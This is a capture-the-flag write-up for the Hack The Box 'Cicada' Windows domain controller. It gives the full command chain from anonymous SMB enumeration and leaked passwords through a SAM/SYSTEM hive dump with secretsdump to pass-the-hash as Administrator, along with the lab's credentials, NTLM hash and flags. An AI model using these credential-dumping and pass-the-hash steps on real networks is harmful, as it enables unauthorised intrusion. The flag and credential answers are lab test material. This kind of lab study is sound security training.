# HTB: Cicada

**Difficulty:** Easy  
**OS:** Windows  
**IP:** 10.129.231.149

## Executive Summary
A Windows Domain Controller vulnerable to credential exposure at multiple levels: default passwords in HR shares, plaintext credentials in AD description fields, and hardcoded credentials in backup scripts. Initial access via `emily.oscars` (WinRM) who is a member of **Backup Operators**, allowing a trivial SAM dump via `SeBackupPrivilege` to achieve local Administrator.

## Attack Chain
```
Anonymous SMB (HR share)
    → Default password for michael.wrightson (unchanged)
    → lookupsid enumeration
    → david.orelious AD description password leak
    → DEV share access → Backup_script.ps1
    → emily.oscars credentials (plaintext in script)
    → WinRM (Backup Operators group)
    → SeBackupPrivilege → reg save SAM/SYSTEM
    → Administrator NTLM hash
    → Pass-the-Hash → Administrator shell → root.txt
```

## Initial Access

### 1. SMB Recon — HR Share
```bash
smbclient //10.129.231.149/HR -N
```
**Finding**: `Notice from HR.txt` reveals default password `Cicada$M6Corpb*@Lp#nZp!8` for all new hires.

### 2. User Enumeration
```bash
lookupsid.py anonymous@10.129.231.149
```
Discovered domain users: `michael.wrightson`, `david.orelious`, `emily.oscars`, and others.

### 3. david.orelious — AD Description Password Leak
```bash
# Password found in AD description field
Password: aRt$Lp#7t*VQ!3
```

### 4. DEV Share → Backup_script.ps1
```bash
smbclient //10.129.231.149/DEV -U david.orelious -p 'aRt$Lp#7t*VQ!3'
```
**Key Finding** — `Backup_script.ps1` contains plaintext credentials:
```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

### 5. WinRM Access — emily.oscars
```bash
evil-winrm -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```
**Groups**: Backup Operators, Remote Management Users  
**Privileges**: `SeBackupPrivilege` ✅, `SeRestorePrivilege` ✅

### 6. User Flag
```
C:\Users\emily.oscars.CICADA\Desktop\user.txt
a170fe42ba2d5479cf7a55275e91c3e1
```

## Privilege Escalation

### SeBackupPrivilege → SAM Dump → PTH

`SeBackupPrivilege` is granted to Backup Operators and allows reading protected registry hives (SAM/SYSTEM) via `reg save`, bypassing normal ACL restrictions.

### 1. Dump SAM and SYSTEM Hives
```bash
reg save HKLM\SAM C:\Users\emily.oscars.CICADA\Documents\SAM
reg save HKLM\SYSTEM C:\Users\emily.oscars.CICADA\Documents\SYSTEM
```
Download via SMB, then extract locally.

### 2. Extract NTLM Hashes
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
Output:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
```

### 3. Pass-the-Hash — Administrator
```bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i 10.129.231.149
```
Since this is a Domain Controller, local Administrator == Domain Administrator.

### 4. Root Flag
```
C:\Users\Administrator\Desktop\root.txt
9bef445a9b94a35b877d20fd3de7d781
```

## Flags
| Level | Flag |
|-------|------|
| User | `a170fe42ba2d5479cf7a55275e91c3e1` |
| Root | `9bef445a9b94a35b877d20fd3de7d781` |

## Credentials Summary
| User | Password | Source |
|------|----------|--------|
| michael.wrightson | `Cicada$M6Corpb*@Lp#nZp!8` | HR share (default creds) |
| david.orelious | `aRt$Lp#7t*VQ!3` | AD description field |
| emily.oscars | `Q!3@Lp#M6b*7t*Vt` | Backup_script.ps1 (plaintext) |
| Administrator | `2b87e7c93a3e8a0ea4a581937016f341` (NTLM) | SAM dump |

## Lessons Learned
- **HR/IT shares are goldmines**: Onboarding docs often contain default credentials
- **AD description fields are a classic credential leak**: Never store passwords in user attributes
- **Backup scripts expose service account credentials**: Hardcoded plaintext credentials in automation scripts are a common finding
- **SeBackupPrivilege = instant SYSTEM on DCs**: Even without admin, Backup Operators can dump SAM/SYSTEM via `reg save` and achieve local admin
- **NTLM hash = password equivalent**: Pass-the-Hash requires no cracking — just the hash

## Full Documentation
See `boxes/retired/Cicada/` for complete notes including raw enumeration logs and loot (SAM/SYSTEM hives).
